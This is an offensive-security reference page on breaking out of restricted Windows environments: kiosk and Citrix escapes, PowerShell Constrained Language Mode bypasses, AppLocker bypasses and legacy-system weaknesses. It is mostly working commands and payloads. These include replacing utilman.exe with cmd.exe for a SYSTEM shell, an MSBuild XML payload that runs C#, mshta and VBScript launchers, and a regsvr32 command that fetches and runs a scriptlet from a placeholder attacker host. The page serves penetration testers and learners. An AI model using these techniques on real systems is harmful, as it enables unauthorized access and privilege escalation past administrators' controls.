---
title: 'Restricted Environment Breakouts'
description: 'Escaping Citrix, kiosks, AppLocker, PowerShell Constrained Language Mode, and other restricted Windows environments.'
---

# Restricted Environment Breakouts

---

## Citrix / Kiosk / RDP Breakouts

When you're in a locked-down environment with no desktop or limited application access:

### File Dialog Escape

1. Open any application's **File → Open** or **File → Save As**
2. In the file dialog address bar, type:
   - `C:\Windows\System32\cmd.exe` → press Enter
   - `\\ATTACKER_IP\share` → access SMB share
3. Right-click in file dialog → **Open command window here** (Win 7)
4. Type `shell:desktop` in the address bar to navigate to your desktop

### Help Menu Escape

1. Press `F1` or open **Help → About** in any application
2. Look for hyperlinks in the help window
3. Right-click a link → **Open in new window**
4. Use the browser address bar: `file:///C:/Windows/System32/cmd.exe`
5. Or navigate to: `file:///C:/Windows/explorer.exe`

### Keyboard Shortcuts

| Shortcut | Action |
|:---------|:-------|
| `Ctrl+Shift+Esc` | Task Manager → File → Run new task → `cmd` |
| `Win+R` | Run dialog → `cmd.exe` or `powershell.exe` |
| `Win+E` | File Explorer → navigate to `cmd.exe` |
| `Win+X` | Power User menu (Win 10) → Command Prompt |
| `Ctrl+Alt+Del` | Security menu → Task Manager |
| `Win+L` then `Win+U` | Lock screen → Accessibility (if backdoored) |

### Accessibility Features

```
:: These run at login screen as SYSTEM
C:\Windows\System32\osk.exe        :: On-Screen Keyboard
C:\Windows\System32\narrator.exe   :: Narrator
C:\Windows\System32\magnify.exe    :: Magnifier
C:\Windows\System32\utilman.exe    :: Utility Manager (Win+U)
C:\Windows\System32\sethc.exe      :: Sticky Keys (Shift x5)
```

If you have `SeRestorePrivilege` or file write access, replace these with `cmd.exe`:

```cmd
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /Y
:: Now press Win+U on login screen = SYSTEM shell via RDP
```

### Script-Based Breakouts

```cmd
:: Create a .bat file from Notepad and execute it
:: In Notepad: File → Save As → "shell.bat" → type: cmd /c whoami > output.txt

:: Use built-in scripting engines
mshta.exe "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe');close();"

:: VBScript
echo WScript.CreateObject("WScript.Shell").Run "cmd.exe" > run.vbs
cscript run.vbs
wscript run.vbs
```

### Application-Specific Breakouts

| Application | Technique |
|:-----------|:---------|
| Microsoft Office | Macro: `Shell "cmd.exe"` |
| Internet Explorer | Address bar: `file:///C:/Windows/System32/cmd.exe` |
| Adobe Reader | JavaScript console (if enabled) |
| Notepad | Save As → change type to `All Files (*.*)` → navigate to executables |
| Paint | File → Open → navigate to `cmd.exe` and right-click |

---

## PowerShell Constrained Language Mode (CLM) Bypass

### Detection

```powershell
$ExecutionContext.SessionState.LanguageMode
# "ConstrainedLanguage" = restricted
# "FullLanguage" = unrestricted
```

### What CLM Blocks

- `Add-Type` (loading .NET assemblies)
- Custom .NET class instantiation (e.g., `[System.Reflection.Assembly]`)
- COM object creation
- Win32 API calls via PowerShell
- Certain cmdlets and operators

### Bypass 1: PowerShell v2

If PowerShell v2 is installed, it doesn't support CLM:

```cmd
powershell.exe -version 2 -c "$ExecutionContext.SessionState.LanguageMode"
:: Should return "FullLanguage"

:: Check if v2 is available
reg query "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```

### Bypass 2: MSBuild

MSBuild can execute arbitrary C# code from XML files:

```xml
<!-- payload.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class ClassExample : Task, ITask {
            public override bool Execute() {
              System.Diagnostics.Process.Start("cmd.exe");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

### Bypass 3: InstallUtil

```cmd
:: Execute a .NET assembly via InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\temp\bypass.exe
```

---

## AppLocker Bypass

### Check AppLocker Status

```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

```cmd
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2"
```

### Default Writable Directories

Default AppLocker rules typically allow execution from:

```
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
C:\Windows\Registration\CRMLog\
C:\Windows\System32\FxsTmp\
C:\Windows\System32\com\dmp\
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
C:\Windows\System32\spool\drivers\color\
C:\Windows\System32\Tasks_Migrated\
C:\Windows\SysWOW64\Tasks\
C:\Windows\SysWOW64\com\dmp\
```

```cmd
:: Copy binary to writable location and execute
copy C:\temp\payload.exe C:\Windows\Tasks\payload.exe
C:\Windows\Tasks\payload.exe
```

### LOLBAS (Living Off the Land Binaries)

Use legitimate Windows binaries to bypass AppLocker.

**Reference**: [lolbas-project.github.io](https://lolbas-project.github.io/)

| Binary | Use |
|:-------|:----|
| `mshta.exe` | Execute HTA/JavaScript |
| `certutil.exe` | Download files, decode base64 |
| `msbuild.exe` | Execute C# from XML |
| `installutil.exe` | Execute .NET assemblies |
| `regsvr32.exe` | Execute DLLs/scriptlets |
| `rundll32.exe` | Execute DLL functions |
| `cscript.exe` / `wscript.exe` | Execute VBS/JS scripts |
| `forfiles.exe` | Execute commands |
| `pcalua.exe` | Program Compatibility Assistant |

### regsvr32 AppLocker Bypass (Squiblydoo)

```cmd
:: Create an SCT file on your web server, then:
regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll
```

### WDAC (Windows Defender Application Control) Bypass

WDAC is stricter than AppLocker. Common bypasses:

- Signed Microsoft binaries (LOLBAS)
- DLL sideloading of trusted applications
- Managed code (MSBuild, InstallUtil)

---

## Legacy & EOL Systems

### Quick Reference

| OS | End of Life | Key Vulnerabilities |
|:---|:-----------|:-------------------|
| Windows XP / Server 2003 | Apr 2014 | MS08-067, MS17-010 |
| Windows Vista / Server 2008 | Jan 2020 | MS09-050, MS16-032 |
| Windows 7 / Server 2008 R2 | Jan 2020 | MS16-032, EternalBlue |
| Windows 8.1 / Server 2012 R2 | Oct 2023 | Various kernel exploits |

### Key Considerations

- **No Defender/AMSI**: Older systems often lack modern AV → tools run freely
- **WDigest enabled**: Win 7/2008 R2 → cleartext passwords in LSASS by default
- **SMBv1 enabled**: Vulnerable to EternalBlue (MS17-010)
- **NTLMv1 may be allowed**: Easier to crack or relay
- **Fewer kernel protections**: No HVCI, weaker ASLR, no CFG
